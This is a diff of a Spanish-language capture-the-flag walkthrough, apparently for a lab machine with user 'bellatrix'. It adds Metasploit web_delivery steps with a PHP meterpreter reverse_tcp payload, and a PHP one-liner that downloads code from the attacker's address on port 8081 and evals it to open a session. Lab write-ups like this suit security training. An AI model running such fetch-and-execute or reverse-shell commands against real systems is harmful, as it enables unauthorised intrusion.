@@ -89,11 +89,34 @@ Ahora explotaremos la vulnerabilidad para ser user.
 Lo primero iremos al metasploit y seguiremos estos comandos para crear u nscript y conseguir ser user.
 ```
 use exploit/multi/script/web_delivery
+msf6 exploit(multi/script/web_delivery) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Python
+   1   PHP
+   2   PSH
+   3   Regsvr32
+   4   pubprn
+   5   SyncAppvPublishingServer
+   6   PSH (Binary)
+   7   Linux
+   8   Mac OS X
+msf6 exploit(multi/script/web_delivery) > set target 1
 msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
-msf exploit (web_delivery)> set lhost 192.168.1.123
+msf exploit (web_delivery)> set lhost 192.168.221.4
 msf exploit (web_delivery)>set srvport 8081
 msf exploit (web_delivery)>exploit
 ```
+
+```
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.221.4:8081/CPKPsYZc', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+```
+
+> Aquí el payload que me ha dado
+
 Esto no creara un payload que meteremos en la url escrita anteriormente y nos crara un session en meterpreter.
 
 Por ahora somos usuario **bellatrix**
